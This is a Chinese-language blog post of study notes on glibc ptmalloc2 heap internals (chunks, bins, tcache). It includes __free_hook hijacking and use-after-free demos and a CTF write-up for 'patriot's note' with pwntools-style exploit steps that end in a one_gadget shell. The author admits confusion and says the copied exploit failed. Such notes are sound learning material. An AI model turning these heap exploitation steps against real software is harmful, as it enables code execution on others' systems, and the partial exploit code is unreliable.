---
layout: post
title:  "Heap-first"
date:   2020-03-01 19:31:29 +0900
categories: jekyll update
---


# 堆

**（ptmalloc2 - glibc）**

## malloc 机制

- size >= 128KB -> mmap -> sys_mmap

- size < 128KB -> brk -> sys_brk

  无论一开始malloc 多少空间 < 128KB 	kernel 都会给132 KB 的heap segment （rw）这个部分称为 main arena。



## chunk 

堆，第一时间想到的是 ：malloc 函数返回对应大小字节的内存块的指针，这个内存块就是堆块。所有的这些堆块都是保存在堆上，这块内存区域在申请新的内存时会不断的扩大，即由低地址向高地址增长。 

不管怎么样，用户请求分配的空间在ptmalloc中都使用一个chunk 来表示。

**glibc源码中定义的堆块：**

```c
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */

  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

 

  struct malloc_chunk* fd;         /* double links -- used only if free. */

  struct malloc_chunk* bk;

 

  /* Only used for large blocks: pointer to next larger size.  */

  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */

  struct malloc_chunk* bk_nextsize;

};
```

x86，32位 ：chunk -- 8字节整数倍

x64，64位 :   chunk -- 16字节整数倍

**free chunk**

![image-20210301184734813](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20210301184734813.png)![enter description here](./images/image-20210301184734813_2.png)

**64 bit  free chunk**   （0x10递进）

//chunk 堆头

- prev_size (8字节)  ： 前一个chunk 的大小 （只有前面一个chunk 为free chunk 才有意义，因为prev_size 只有在管理空闲堆才会用）

- size ：当前 chunk 大小，该字段最低3个bit 
  - N : 当前chunk是否属于非 Main_Arena
  - M : 是否为mmap出来的
  - **P：代表前一个chunk是否inuse**
- fd :前向指针
- bk :后向指针   //8byte ，这两个字段用于bin链表，链接大小相同或相近的 free chunk 
- unused : (large bin 在这里会多两块： fd_next bk_next)



**allocated chunk**

![image-20210301185707290](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20210301185707290.png)![enter description here](./images/image-20210301185707290_1.png)

malloc 返回的指针为图中mem指向的地址



#  空闲chunk容器



## Bins

用来管理和组织**空闲**内存块的链表结构，根据chunk的大小和状态，有许多种不同的Bins结构

- Fast bins : 用于管理小的chunk
- Bins
  - small bins : 用于管理中等大小的chunk
  - large bins : 用于管理较大的chunk
  - unsorted bins : 用于存放未整理的chunk



**Ptmalloc 一共维护了128（NBINS）个bin，并使用一个数组来存储这些bins（下图）**

![image-20210301145504964](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20214131128488.png)

- bin[0] : unsorted bin
- bin[2] - [63] : small bin ,同一个small bin 链表中的chunk的大小相同，两个相邻索引的small bin 链表中的chunk大小相差 **2个机器字长**；	即32位：8byte ；64位： 16byte。



## fast bins 

小内存块的高速缓存

即当一些大小小于 64 字节的chunk被回收时，首先放入 fast bins；

在分配小内存时，首先会查看fast bins 中是否有合适的内存块，存在则直接返回 fast bins。



- **单向链表 ：即只用了 fd**

- **相同大小的chunk放在一个相同的bin中**
- **fastbin 范围的 chunk 的 inuse 始终为1**

- **后进先出（First in last out）**：就比如，有两个 32byte chunkA，B，先把A释放掉，fastbinsY[0]->A，再释放掉B，此时fastbinsY[0]->B,而B的fd->A;而再申请的时候，会先去申请B，再去申请A。

```c
eg.	fastbin[0] : 0x6024c0(B) --> 0x602000(A) ---> 0x0

    fastbin[1] : 0x0
```

- **相邻的空闲 fast bin chunk 不会被合并**

```C
struct malloc_state
{
	mutex_t mutex;
	
	int flags;
	
	mfastbinptr fastbinsY[NFASTBINS];
	
	mchunkptr top;
	
	mchunkptr last_remainder;
	
	mchunkptr bins[NBINS*2-2]
	/*...*/
};
```

fast bins 为**（指针）数组**，每一个都是指针，也可以为空如果当前没有对应大小的fastbin（0x0）

（64bit）fastbinsY[0] -> 32byte 的 fastbins的链表

​				 fastbinsY[1] ->  48byte 的 fastbins 链表

指针指向的链表，里面一定是相同的大小的bin



## Unsorted bin

**可以看成垃圾桶，就是free chunk 回归其所属 bin之前的缓存区;**

里面的 chunk 未进行排序，存储的chunk杂乱。

它只有一个，





## Top chunk

内存是按地址从低向高进行分配的，在空闲内存的最高处，必然存在着一块空闲chunk，叫做top chunk。

当bins 和 fast bins 都不能满足分配需要时，才会在top chunk 中分出一块内存给用户，如果top chunk 本身不够大，分配程序则会重新分配一个sub-heap，并将top chunk 迁移到新的 sub-heap上，新的与已有的 sub-heap 用单向链表连接起来，再在新的top chunk 分配所需内存。

Top chunk 的大小是随着分配和回 收不停变换的，如果从 top chunk 分配内存会导致 top chunk 减小，如果回收的 chunk 恰好 与 top chunk 相邻，那么这两个 chunk 就会合并成新的 top chunk，从而使 top chunk 变大。



## Merge freed chunk

为了避免heap中太多碎的 chunk ，在free的时候会检查周围chunk 是否为free 并进行合并，然后unlink 去除bin中重复的chunk。

- 即**先**如果上一块是 freed ：则合并（merge）上一块chunk并对上一块做unlink

- 如果下一块是 top chunk ：则合并到top

- 如果下一块是 freed chunk ，则合并然后对下一块做unlink，然后加入unsortbin中

  ​	判断：她会取 0x6020b0 + 0x410(当前chunk 地址 + size) 

  ​				x/2gx 0x6020b0 + 0x410 ，看第二块（size 段的最后一位P是否为0）

- 如果下一块是 inuse chunk ： 加入 unsortbin

比如：

```c
//small bin
0x4b000
0x4b000

//unsorted bin
&unsortbin
&unsortbin
```



```c
//malloc 3 块
prev_size = 0	   //0x4b000
size = 0x90
fd = &small bin
bk = &small bin    //freed

prev_size = 0x90   //8 bit
size = 0x90		   //8 bit
					<- P 

					//inuse
prev_size = 0
size = 0x91

					//inuse
```

```c
free(P)				//流程
1.先利用 size 找到下一块 chunk ： P - 0x10 + 0x90 
2.利用inuse bit，检查是否有被free过  //double free
3.检查上一块是否为 freed
4.是则利用 prev_size 找到上一块： P - 0x10 - 0x90
5.unlink 上一块chunk，从 bin（linked list）移出
6.merge
7.放入unsorted bin
```

**call free 前，rdi 参数为 （0x6020c0）chunk 位置 ，在x/30gx 0x  时，记得 把0x6020c0 - 0x10 -> chunk header **

-> 0x6020b0:		0x000000000000000		**0x00000000000411**



size : 0x400 (因为最后一个bit 具有特殊含义)

# 漏洞利用

### __free_hook 劫持

**//glibc-2.19/malloc/malloc.c:1830**

```c
cvoid weak_variable (*__free_hook) (void *__ptr,
                                    const void *) = NULL;
```



**// glibc-2.19/malloc/malloc.c:2913**

```c
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }
```

​	

上面的代码对是**free()函数**的一部分，可以看出程序先把全局变量_free_hook赋给了局部变量hook,然后对hook是否为NULL进行判断，**如果不为空，则执行hook**,第一个参数就是chunk的内容部分。

一般的情况下__free_hook是为NULL的，所以是不会执行的，但是如果有人恶意修改__free_hook的话，就会造成__free_hook劫持。



```c
int main()
{
	char *str = malloc(160);
	strcpy(str,"/bin/sh");
	
	printf("__free_hook: 0x%016X\n",__free_hook);
	// 劫持__free_hook
	__free_hook = system;

	free(str);
	return 0;
}
```

就像这样，在执行 free（str）函数时，str = "/bin/sh" 作为参数，由于hook != NULL,于是执行hook = system,从而getshell.



### Use After Free

*在delete 函数中，free()之后的堆块没有被清空，存在uaf漏洞，即该内存块被释放之后存在再次被使用的可能。*

**即当 free 完之后，并未将 pointer 设成 null，而继续使用该 pointer**

**这个pointer 称为 dangling pointer / 野指针**    --> 可能造成任意位置读写

就比如(wiki上的例子)：

```c
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");
  // free without modify
  free(a);
  a->func("I can also use it");
  // free with modify
  a->func = printmyname;
  a->func("this is my function");
  // set NULL
  a = NULL;
  printf("this pogram will crash...\n");
  a->func("can not be printed...");
}

//result:
this is my function
I can also use it
call print my name
this pogram will crash...
```

这里free(a)以后，a未及时被 设置为NULL；且其指向的内存块未被修改，则下一次使用时很可能正常运转，而在被置为NULL后，再次使用则程序会崩溃。



### Tcache机制

Tcache机制应该是从2.26之后版本的libc中才加进去的，而这个机制可能使我们的攻击变得更加简单，因为我们可能不需要去构造false_chunk,**只需要覆盖tcache中的next，即将tcache中的next覆盖为我们自己的地址，从而达到任意地址写入；**
简单地来讲，Tcache机制就是增加一个bin缓存，而且每个bin是单链表结构，单个tcache bin默认最多包含7个块；在释放chunk时，_int_free中在检查了size合法后，放入fastbin之前，它先尝试将其放入tcache；而在__libc_malloc，_int_malloc之前，如果tcache中存在满足申请需求大小的块，就从对应的tcache中返回chunk；
最关键的是，因为没有任何检查，所以我们可以对同一个chunk连续多次free，造成cycliced list(想一下double_free的操作，有点相像的感觉)；

并且类似于fastbins，是一个单链表。**在释放大小为0x0-0x400大小的堆的时候，首先会被释放入对应长度tcachebins对应的链表中，**当长度超出7后，再放入fastbin或unsortbins中。malloc的时候当发现malloc对应大小的堆，先从tcachebins中取出。注意当如果从fastbin中取出了一个块，那么会把剩余的块放入tcache中直至填满tcache（smallbin中也是一样）。如果进入了unsortedbin，且chunk的size和当前申请的大小精确匹配，那么在tcache未满的情况下会将其放入到tcachebin中

## Hgame week2 patriot's note WP

ida里面查看

delete函数

![image-20210224131203707](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20210224131203707.png)

可以看到delete函数中，内存块被释放后，其对应的指针没有被设置为 NULL ，存在 ues after free 漏洞。

show函数

![image-20210224131128488](C:\Users\李小丫\AppData\Roaming\Typora\typora-user-images\image-20210224131128488.png)



由于知识有限，这里直接按照官方exp补充分析并提出问题* — * 

第一步，分配一个超大的堆（free 后去往 unsorted bin） 

```python
take(0x500)
```

*这里让他之后到 unsorted bin 里面应该是为了后续  free 进 tcachebin 里面吧*

*tcache是libc2.26之后引进的一种新机制，类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找。*

Q:按这样说的话，为啥free之后没有进入tcache里面？

第二步，随便分配一个堆防止free上一步堆的时候与后面的合并

```python
take(0x40)
```

*因为free函数在释放堆块时，会通过隐式链表判断相邻前、后堆块是否为空闲堆块；如果堆块为空闲就会进行合并*

第三步，free 第一步的堆

```python
delate(0)
```

```python
#gdb
unsortedbin
all:0x563fd3e98670 -> 0x7f3fc8870ca0 (main_arena+96) <- 0x
```

第四步，用show函数打印出 main_arena+96 的地址，知道libc版本，本地看偏移，从而算出libc的基地址以及free_hook地址

```python
show(0)
libc_addr = u64(r.recvuntil('\x7f')[1:].ljust(8,'\x00')) + 0x7f2b766ab000 -0x7f2b76a96ca0
print 'libc_addr',hex(libc_addr)
one = libc_addr + 0x4f432
print 'one',hex(one)
free_hook = libc_addr + libc.symbols['__free_hook']
print 'free_hook',hex(free_hook)

```

 Q : 

```python
libc_addr = u64(r.recvuntil('\x7f')[1:].ljust(8,'\x00')) + 0x7f2b766ab000 -0x7f2b76a96ca0
```

对于这一步，没看太明白哈，为什么不是减去96再减main_arena的偏移从而得到libc基地址

第五步，释放需要控制的指针（进入tcachebins）

```python
take(0x40) #2

dele(2)
```

个人想法：从上面的前置内容： 

```python
在释放大小为0x0-0x400大小的堆的时候，首先会被释放入对应长度tcachebins对应的链表中
```

所以这个堆块2 进入了tcachebins  //不确定？

第六步，利用use after free 修改该指针的fd指针指向__free_hook

```python
edit(2,p64(__free_hook))
```

gdb:

```python
tcachebins
0x50 [  1]: 0x559472e1f680 -> 0x7fb203e8b8e8(__free_hook) <- ...
```

[   1] : 据了解，这个应该是tc_index

前置内容：

```python
只需要覆盖tcache中的next，即将tcache中的next覆盖为我们自己的地址，从而达到任意地址写入  #其实没有理解到
```

第七步，分配两次堆，从而第二个堆就在__free_hook上了

```python
take(0x40)
take(0x40)
```

据了解，这之后，tcachebins 为空了，而且它的 tc_index -> [  -1],这会导致接下来不可以再使用tcachebins，否则程序可能会报错。

Q：这些我都不知道为啥？



第八步，用edit函数使 __free_hook 为 one_gadget

```python
edit(4,p64(one))
```

前置内容：__free_hook 劫持 

此时，hook != NULL,所以在free时会执行它。

第九步，随便free一个堆块从而执行one_gadget -> getshell.

```python
dele(1)
```



说实在，很多地方是没搞太懂的，然后WP抄上去打也报错了，不知道为啥。